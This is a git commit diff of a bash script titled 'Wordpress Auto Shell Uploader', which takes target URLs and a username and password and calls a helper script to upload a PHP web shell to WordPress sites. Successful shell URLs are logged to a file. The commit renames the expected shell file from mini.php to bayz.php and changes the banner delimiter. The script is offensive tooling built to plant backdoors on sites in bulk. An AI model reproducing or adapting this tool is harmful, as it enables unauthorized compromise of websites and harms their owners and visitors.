20b0ff33963d979e2ea9e3c9450222f00f4c4dd1
Bayz21 <39861892+Bayz21@users.noreply.github.com>
2018-09-10 20:28:12 +0700

    Update wp-eue.sh

--- wp-eue.sh
+++ wp-eue.sh
@@ -4,7 +4,7 @@ function exploit() {
     ceker=$(timeout 10 curl -s --write-out %{http_code} -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" --output /dev/null $1);
     if [[ $ceker =~ '200' ]] || [[ $ceker =~ '302' ]] || [[ $ceker =~ '301' ]]; then
         upshl=$(timeout 10 python bayz.py -t $1 -u $user -p $pass);
-        if [[ $upshl =~ 'mini.php' ]]; then
+        if [[ $upshl =~ 'bayz.php' ]]; then
             echo "[Success] => $upshl";
 			echo "$upshl" >> hasil.txt
         else
@@ -15,7 +15,8 @@ function exploit() {
 fi
 
 }
-cat << "ZERO"
+cat << "VOSS"
+
 
 ██████╗  █████╗ ██╗   ██╗███████╗██████╗  ██╗
 ██╔══██╗██╔══██╗╚██╗ ██╔╝╚══███╔╝╚════██╗███║
@@ -26,8 +27,8 @@ cat << "ZERO"
 ---------------------------------------------
 ------- Wordpress Auto Shell Uploader -------
 ---------------------------------------------
- 
-ZERO
+
+VOSS
 echo -n "Masukan Username : " ;
 read user
 echo -n "Masukan Password : " ;
